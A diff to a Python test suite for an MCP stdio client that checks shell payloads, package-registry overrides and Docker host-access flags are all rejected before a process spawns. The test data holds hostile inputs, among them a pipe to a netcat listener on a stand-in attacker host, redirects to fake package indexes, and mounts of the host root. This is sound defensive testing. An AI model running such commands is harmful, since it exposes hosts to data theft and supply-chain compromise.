@@ -12,6 +12,7 @@ import re
 import shutil
 import sys
 from contextlib import suppress
+from typing import get_type_hints
 from unittest.mock import AsyncMock, MagicMock, patch
 
 import httpx
@@ -55,6 +56,21 @@ def test_validate_mcp_stdio_env_allows_regular_env():
 _SHELL_INTERPRETERS = frozenset({"bash", "sh", "zsh", "cmd", "cmd.exe", "powershell", "powershell.exe", "/bin/sh"})
 
 
+def _stdio_client_with_mocked_session() -> tuple[MCPStdioClient, AsyncMock]:
+    """Return a real stdio client whose session creation cannot spawn a process."""
+    client = MCPStdioClient()
+    mock_session = MagicMock()
+    mock_session.list_tools = AsyncMock(return_value=MagicMock(tools=[]))
+    get_session = AsyncMock(return_value=mock_session)
+    client._get_or_create_session = get_session  # type: ignore[method-assign]
+    return client, get_session
+
+
+@pytest.fixture
+def stdio_client() -> MCPStdioClient:
+    return _stdio_client_with_mocked_session()[0]
+
+
 class TestMCPStdioShellFreeLaunch:
     """Tests for the shell=False stdio launcher.
 
@@ -68,11 +84,8 @@ class TestMCPStdioShellFreeLaunch:
     @staticmethod
     def _client_with_mocked_session():
         """Return a client whose session creation is stubbed so no process spawns."""
-        client = MCPStdioClient()
-        mock_session = MagicMock()
-        mock_session.list_tools = AsyncMock(return_value=MagicMock(tools=["sentinel-tool"]))
-        get_session = AsyncMock(return_value=mock_session)
-        client._get_or_create_session = get_session  # type: ignore[method-assign]
+        client, get_session = _stdio_client_with_mocked_session()
+        get_session.return_value.list_tools.return_value.tools = ["sentinel-tool"]
         return client, get_session
 
     async def test_benign_command_launches_without_shell(self):
@@ -123,26 +136,15 @@ class TestMCPStdioShellFreeLaunch:
             "node server.js | nc attacker 4444",  # pipe to listener
         ],
     )
-    async def test_shell_metacharacter_payloads_become_literal_argv(self, payload):
-        """Shell metacharacters are inert: with no shell, they are just literal argv tokens.
+    async def test_shell_metacharacter_payloads_are_rejected_before_spawn(self, payload):
+        """The shared API/runtime policy rejects shell syntax even with shell-free launch."""
+        client, get_session = self._client_with_mocked_session()
 
-        Under the old ``bash -c "exec ..."`` wrapper these payloads would chain a
-        second command. With shell=False the launched binary is the real
-        executable and the metacharacters are passed to it verbatim -- there is no
-        shell to interpret ``;``, ``&&``, ``|``, ``$()`` or backticks.
-        """
-        client, _ = self._client_with_mocked_session()
+        with pytest.raises(ValueError, match="dangerous shell metacharacter"):
+            await client._connect_to_server(payload)
 
-        await client._connect_to_server(payload)
-
-        params = client._connection_params
-        # The real binary is launched, never a shell.
-        assert params.command == "node"
-        assert params.command not in _SHELL_INTERPRETERS
-        # The dangerous tokens survive only as literal arguments handed to node,
-        # so they cannot spawn `touch`, `rm`, `nc`, or a substitution subshell.
-        joined = " ".join(params.args)
-        assert any(marker in joined for marker in (";", "&&", "|", "$(", "`"))
+        get_session.assert_not_awaited()
+        assert client._connection_params is None
 
     async def test_bash_func_env_is_rejected_before_any_spawn(self):
         """BASH_FUNC_* (Shellshock-style) env is both inert under shell=False and rejected.
@@ -191,6 +193,79 @@ class TestMCPStdioShellFreeLaunch:
             await client._connect_to_server("python server.py", env=dangerous_env)
 
         get_session.assert_not_awaited()
+
+    @pytest.mark.parametrize(
+        "dangerous_env",
+        [
+            {"NPM_CONFIG_REGISTRY": "https://packages.example.invalid"},
+            {"UV_DEFAULT_INDEX": "https://packages.example.invalid/simple"},
+            {"UV_INDEX_URL": "https://packages.example.invalid/simple"},
+            {"PIP_INDEX_URL": "https://packages.example.invalid/simple"},
+        ],
+    )
+    async def test_package_source_env_is_rejected_before_any_spawn(self, dangerous_env):
+        client, get_session = self._client_with_mocked_session()
+
+        with pytest.raises(ValueError, match="not allowed"):
+            await client._connect_to_server("uvx mcp-server", env=dangerous_env)
+
+        get_session.assert_not_awaited()
+
+    @pytest.mark.parametrize(
+        "command",
+        [
+            "uvx --default-index https://packages.example.invalid/simple mcp-server",
+            "uvx --from git+https://code.example.invalid/server.git mcp-server",
+            "npx --registry=https://packages.example.invalid @example/mcp-server",
+            "docker run -v /:/host mcp-server",
+            "docker run --mount type=bind,source=/,target=/host mcp-server",
+            "docker run --volumes-from other mcp-server",
+            "docker run --device=/dev/example mcp-server",
+            "docker run --network host mcp-server",
+            "docker run --security-opt seccomp=unconfined mcp-server",
+            "sh -c 'uvx --default-index https://packages.example.invalid/simple mcp-server'",
+        ],
+    )
+    async def test_source_args_and_docker_host_access_are_rejected_before_any_spawn(self, command):
+        client, get_session = self._client_with_mocked_session()
+
+        with pytest.raises(ValueError, match="not allowed"):
+            await client._connect_to_server(command)
+
+        get_session.assert_not_awaited()
+
+    async def test_trusted_uvx_from_and_provider_token_are_preserved(self):
+        client, get_session = self._client_with_mocked_session()
+
+        await client._connect_to_server(
+            "uvx --from lfx lfx-mcp",
+            env={"GITHUB_PERSONAL_ACCESS_TOKEN": "provider-token"},  # pragma: allowlist secret
+        )
+
+        get_session.assert_awaited_once()
+        assert client._connection_params.command == "uvx"
+        assert client._connection_params.args == ["--from", "lfx", "lfx-mcp"]
+        assert client._connection_params.env["GITHUB_PERSONAL_ACCESS_TOKEN"] == "provider-token"  # noqa: S105
+
+    async def test_isolated_docker_args_are_preserved(self):
+        client, get_session = self._client_with_mocked_session()
+
+        await client._connect_to_server(
+            "docker run --rm -i --network bridge --security-opt no-new-privileges mcp-image"
+        )
+
+        get_session.assert_awaited_once()
+        assert client._connection_params.command == "docker"
+        assert client._connection_params.args == [
+            "run",
+            "--rm",
+            "-i",
+            "--network",
+            "bridge",
+            "--security-opt",
+            "no-new-privileges",
+            "mcp-image",
+        ]
 
     async def test_empty_command_is_rejected(self):
         """An empty/whitespace command string raises rather than spawning an empty argv."""
@@ -910,12 +985,8 @@ class TestUpdateToolsStdioHeaders:
     """Test that update_tools injects component headers into stdio args."""
 
     @pytest.mark.asyncio
-    async def test_stdio_headers_injected_with_existing_headers_flag(self):
+    async def test_stdio_headers_injected_with_existing_headers_flag(self, stdio_client):
         """Headers should be injected as --headers key value before the existing --headers flag."""
-        mock_stdio = AsyncMock(spec=MCPStdioClient)
-        mock_stdio.connect_to_server.return_value = []
-        mock_stdio._connected = True
-
         server_config = {
             "command": "uvx",
             "args": [
@@ -930,23 +1001,25 @@ class TestUpdateToolsStdioHeaders:
             "headers": {"Authorization": "Bearer token123"},
         }
 
-        await update_tools("test-server", server_config, mcp_stdio_client=mock_stdio)
+        await update_tools("test-server", server_config, mcp_stdio_client=stdio_client)
 
-        mock_stdio.connect_to_server.assert_called_once()
-        full_command = mock_stdio.connect_to_server.call_args[0][0]
-
-        # The injected --headers should appear before the existing --headers
-        assert "--headers authorization 'Bearer token123' --headers x-api-key sk-existing" in full_command
-        # URL should still be at the end
-        assert full_command.endswith("http://localhost:7860/api/v1/mcp/project/test/streamable")
+        assert stdio_client._connection_params.command == "uvx"
+        assert stdio_client._connection_params.args == [
+            "mcp-proxy",
+            "--transport",
+            "streamablehttp",
+            "--headers",
+            "authorization",
+            "Bearer token123",
+            "--headers",
+            "x-api-key",
+            "sk-existing",
+            "http://localhost:7860/api/v1/mcp/project/test/streamable",
+        ]
 
     @pytest.mark.asyncio
-    async def test_stdio_headers_injected_without_existing_headers_flag(self):
+    async def test_stdio_headers_injected_without_existing_headers_flag(self, stdio_client):
         """When no --headers flag exists, headers should be inserted before the last positional arg."""
-        mock_stdio = AsyncMock(spec=MCPStdioClient)
-        mock_stdio.connect_to_server.return_value = []
-        mock_stdio._connected = True
-
         server_config = {
             "command": "uvx",
             "args": [
@@ -958,20 +1031,21 @@ class TestUpdateToolsStdioHeaders:
             "headers": {"X-Api-Key": "my-key"},
         }
 
-        await update_tools("test-server", server_config, mcp_stdio_client=mock_stdio)
+        await update_tools("test-server", server_config, mcp_stdio_client=stdio_client)
 
-        full_command = mock_stdio.connect_to_server.call_args[0][0]
-
-        # --headers should be inserted before the URL
-        assert "--headers x-api-key my-key http://localhost:7860/streamable" in full_command
+        assert stdio_client._connection_params.args == [
+            "mcp-proxy",
+            "--transport",
+            "streamablehttp",
+            "--headers",
+            "x-api-key",
+            "my-key",
+            "http://localhost:7860/streamable",
+        ]
 
     @pytest.mark.asyncio
-    async def test_stdio_multiple_headers_each_get_own_flag(self):
+    async def test_stdio_multiple_headers_each_get_own_flag(self, stdio_client):
         """Each header should get its own --headers key value triplet."""
-        mock_stdio = AsyncMock(spec=MCPStdioClient)
-        mock_stdio.connect_to_server.return_value = []
-        mock_stdio._connected = True
-
         server_config = {
             "command": "uvx",
             "args": [
@@ -986,155 +1060,163 @@ class TestUpdateToolsStdioHeaders:
             "headers": {"X-Custom-One": "val1", "X-Custom-Two": "val2"},
         }
 
-        await update_tools("test-server", server_config, mcp_stdio_client=mock_stdio)
+        await update_tools("test-server", server_config, mcp_stdio_client=stdio_client)
 
-        full_command = mock_stdio.connect_to_server.call_args[0][0]
-
-        # Each header gets its own --headers flag
-        assert "--headers x-custom-one val1" in full_command
-        assert "--headers x-custom-two val2" in full_command
-        # Original header still present
-        assert "--headers x-api-key sk-existing" in full_command
+        assert stdio_client._connection_params.args == [
+            "mcp-proxy",
+            "--transport",
+            "streamablehttp",
+            "--headers",
+            "x-custom-one",
+            "val1",
+            "--headers",
+            "x-custom-two",
+            "val2",
+            "--headers",
+            "x-api-key",
+            "sk-existing",
+            "http://localhost/streamable",
+        ]
 
     @pytest.mark.asyncio
-    async def test_stdio_no_headers_leaves_args_unchanged(self):
+    async def test_stdio_no_headers_leaves_args_unchanged(self, stdio_client):
         """When no component headers are set, args should not be modified."""
-        mock_stdio = AsyncMock(spec=MCPStdioClient)
-        mock_stdio.connect_to_server.return_value = []
-        mock_stdio._connected = True
-
         server_config = {
             "command": "uvx",
             "args": ["mcp-proxy", "--transport", "streamablehttp", "http://localhost/streamable"],
         }
 
-        await update_tools("test-server", server_config, mcp_stdio_client=mock_stdio)
+        await update_tools("test-server", server_config, mcp_stdio_client=stdio_client)
 
-        full_command = mock_stdio.connect_to_server.call_args[0][0]
-        assert full_command == "uvx mcp-proxy --transport streamablehttp http://localhost/streamable"
+        assert stdio_client._connection_params.args == [
+            "mcp-proxy",
+            "--transport",
+            "streamablehttp",
+            "http://localhost/streamable",
+        ]
 
     @pytest.mark.asyncio
-    async def test_stdio_multiword_command_with_empty_args(self):
-        """A multi-word command string (e.g. 'uvx mcp-server-fetch') with empty args should be split correctly.
-
-        Regression test: shlex.join(["uvx mcp-server-fetch"]) used to produce
-        a single-quoted token that bash treated as one binary name, causing
-        'exec: uvx mcp-server-fetch: not found'.
-        """
-        mock_stdio = AsyncMock(spec=MCPStdioClient)
-        mock_stdio.connect_to_server.return_value = []
-        mock_stdio._connected = True
-
+    @pytest.mark.parametrize(
+        "command",
+        [
+            "uvx mcp-server-fetch",
+            "node -e",
+            "npx\t-y\t@modelcontextprotocol/server-fetch",
+            "/usr/bin/node --version",
+            "C:\\Program Files\\nodejs\\node.exe --version",
+        ],
+    )
+    async def test_stdio_rejects_arguments_embedded_in_command(self, command, stdio_client):
+        """Runtime-loaded configs enforce the same single-executable command boundary."""
         server_config = {
-            "command": "uvx mcp-server-fetch",
+            "command": command,
             "args": [],
         }
 
-        await update_tools("test-server", server_config, mcp_stdio_client=mock_stdio)
+        with pytest.raises(ValueError, match="single executable"):
+            await update_tools("test-server", server_config, mcp_stdio_client=stdio_client)
 
-        full_command = mock_stdio.connect_to_server.call_args[0][0]
-        assert full_command == "uvx mcp-server-fetch"
+        assert stdio_client._connection_params is None
 
     @pytest.mark.asyncio
-    async def test_stdio_multiword_command_with_args(self):
-        """A multi-word command string combined with additional args should produce correct tokens."""
-        mock_stdio = AsyncMock(spec=MCPStdioClient)
-        mock_stdio.connect_to_server.return_value = []
-        mock_stdio._connected = True
+    async def test_stdio_preserves_executable_path_with_spaces(self, stdio_client):
+        """A platform path stays one argv entry while args remain separate."""
+        command = "C:\\Program Files\\nodejs\\node.exe"
 
         server_config = {
-            "command": "uvx mcp-server-fetch",
-            "args": ["--timeout", "30"],
+            "command": command,
+            "args": ["server.js", "--timeout", "30"],
         }
 
-        await update_tools("test-server", server_config, mcp_stdio_client=mock_stdio)
+        await update_tools("test-server", server_config, mcp_stdio_client=stdio_client)
 
-        full_command = mock_stdio.connect_to_server.call_args[0][0]
-        assert full_command == "uvx mcp-server-fetch --timeout 30"
+        assert stdio_client._connection_params.command == command
+        assert stdio_client._connection_params.args == ["server.js", "--timeout", "30"]
 
     @pytest.mark.asyncio
-    async def test_stdio_headers_appended_when_all_args_are_flags(self):
+    async def test_stdio_headers_appended_when_all_args_are_flags(self, stdio_client):
         """When all args are flags (no positional URL), headers should be appended."""
-        mock_stdio = AsyncMock(spec=MCPStdioClient)
-        mock_stdio.connect_to_server.return_value = []
-        mock_stdio._connected = True
-
         server_config = {
             "command": "uvx",
-            "args": ["--verbose", "--debug"],
+            "args": ["--verbose", "--isolated"],
             "headers": {"Authorization": "Bearer tok"},
         }
 
-        await update_tools("test-server", server_config, mcp_stdio_client=mock_stdio)
+        await update_tools("test-server", server_config, mcp_stdio_client=stdio_client)
 
-        full_command = mock_stdio.connect_to_server.call_args[0][0]
-        assert full_command == "uvx --verbose --debug --headers authorization 'Bearer tok'"
+        assert stdio_client._connection_params.args == [
+            "--verbose",
+            "--isolated",
+            "--headers",
+            "authorization",
+            "Bearer tok",
+        ]
 
     @pytest.mark.asyncio
-    async def test_stdio_headers_appended_when_last_token_is_flag_value(self):
+    async def test_stdio_headers_appended_when_last_token_is_flag_value(self, stdio_client):
         """When the last token is a flag's value, headers should be appended, not inserted before it."""
-        mock_stdio = AsyncMock(spec=MCPStdioClient)
-        mock_stdio.connect_to_server.return_value = []
-        mock_stdio._connected = True
-
         server_config = {
             "command": "uvx",
-            "args": ["--port", "8080"],
+            "args": ["--color", "always"],
             "headers": {"Authorization": "Bearer tok"},
         }
 
-        await update_tools("test-server", server_config, mcp_stdio_client=mock_stdio)
+        await update_tools("test-server", server_config, mcp_stdio_client=stdio_client)
 
-        full_command = mock_stdio.connect_to_server.call_args[0][0]
-        # 8080 is a value for --port, not a positional arg, so headers go at the end
-        assert full_command == "uvx --port 8080 --headers authorization 'Bearer tok'"
+        assert stdio_client._connection_params.args == [
+            "--color",
+            "always",
+            "--headers",
+            "authorization",
+            "Bearer tok",
+        ]
 
     @pytest.mark.asyncio
-    async def test_stdio_headers_inserted_before_positional_with_flag_value_pairs(self):
+    async def test_stdio_headers_inserted_before_positional_with_flag_value_pairs(self, stdio_client):
         """Headers should be inserted before the last positional arg even when flag+value pairs precede it."""
-        mock_stdio = AsyncMock(spec=MCPStdioClient)
-        mock_stdio.connect_to_server.return_value = []
-        mock_stdio._connected = True
-
         server_config = {
             "command": "uvx",
             "args": ["mcp-proxy", "--port", "8080", "http://localhost/streamable"],
             "headers": {"X-Api-Key": "my-key"},
         }
 
-        await update_tools("test-server", server_config, mcp_stdio_client=mock_stdio)
+        await update_tools("test-server", server_config, mcp_stdio_client=stdio_client)
 
-        full_command = mock_stdio.connect_to_server.call_args[0][0]
-        # --port 8080 is a flag pair; http://localhost/streamable is the positional arg
-        assert full_command == "uvx mcp-proxy --port 8080 --headers x-api-key my-key http://localhost/streamable"
+        assert stdio_client._connection_params.args == [
+            "mcp-proxy",
+            "--port",
+            "8080",
+            "--headers",
+            "x-api-key",
+            "my-key",
+            "http://localhost/streamable",
+        ]
 
     @pytest.mark.asyncio
-    async def test_stdio_headers_inserted_before_last_positional_with_multiple_positionals(self):
+    async def test_stdio_headers_inserted_before_last_positional_with_multiple_positionals(self, stdio_client):
         """When multiple positional args exist, headers are inserted before the last one."""
-        mock_stdio = AsyncMock(spec=MCPStdioClient)
-        mock_stdio.connect_to_server.return_value = []
-        mock_stdio._connected = True
-
         server_config = {
             "command": "uvx",
             "args": ["mcp-proxy", "--transport", "streamablehttp", "extra-pos-arg", "http://localhost/streamable"],
             "headers": {"X-Key": "val"},
         }
 
-        await update_tools("test-server", server_config, mcp_stdio_client=mock_stdio)
+        await update_tools("test-server", server_config, mcp_stdio_client=stdio_client)
 
-        full_command = mock_stdio.connect_to_server.call_args[0][0]
-        # Should insert before the last positional (the URL), not before "extra-pos-arg"
-        assert "--headers x-key val http://localhost/streamable" in full_command
-        assert "extra-pos-arg --headers" in full_command
+        assert stdio_client._connection_params.args == [
+            "mcp-proxy",
+            "--transport",
+            "streamablehttp",
+            "extra-pos-arg",
+            "--headers",
+            "x-key",
+            "val",
+            "http://localhost/streamable",
+        ]
 
     @pytest.mark.asyncio
-    async def test_stdio_does_not_mutate_original_config(self):
+    async def test_stdio_does_not_mutate_original_config(self, stdio_client):
         """The original server_config args list should not be mutated."""
-        mock_stdio = AsyncMock(spec=MCPStdioClient)
-        mock_stdio.connect_to_server.return_value = []
-        mock_stdio._connected = True
-
         original_args = ["mcp-proxy", "--headers", "x-api-key", "sk-orig", "http://localhost/s"]
         server_config = {
             "command": "uvx",
@@ -1142,7 +1224,7 @@ class TestUpdateToolsStdioHeaders:
             "headers": {"X-Extra": "val"},
         }
 
-        await update_tools("test-server", server_config, mcp_stdio_client=mock_stdio)
+        await update_tools("test-server", server_config, mcp_stdio_client=stdio_client)
 
         # Original list should be unchanged
         assert original_args == ["mcp-proxy", "--headers", "x-api-key", "sk-orig", "http://localhost/s"]
@@ -3725,6 +3807,26 @@ class TestConvertMcpResult:
         json.loads(converted[0]["text"])
 
 
+def test_mcp_structured_tool_annotations_resolve_in_util_namespace():
+    """Keep LangChain's inherited forward annotations resolvable for Pydantic."""
+    from langchain_core.tools import StructuredTool
+
+    annotation_proxy = type(
+        "MCPStructuredToolAnnotations",
+        (),
+        {"__annotations__": StructuredTool.__annotations__},
+    )
+
+    resolved = get_type_hints(
+        annotation_proxy,
+        globalns=vars(util),
+        localns=vars(util),
+        include_extras=True,
+    )
+
+    assert set(StructuredTool.__annotations__) <= set(resolved)
+
+
 class TestMCPStructuredToolToolCallId:
     """Tests for the tool_call_id branching inside MCPStructuredTool.
 
@@ -3752,6 +3854,7 @@ class TestMCPStructuredToolToolCallId:
             content.append(img_block)
 
         result = MagicMock()
+        result.isError = False
         result.content = content
         result.structuredContent = None
         return result
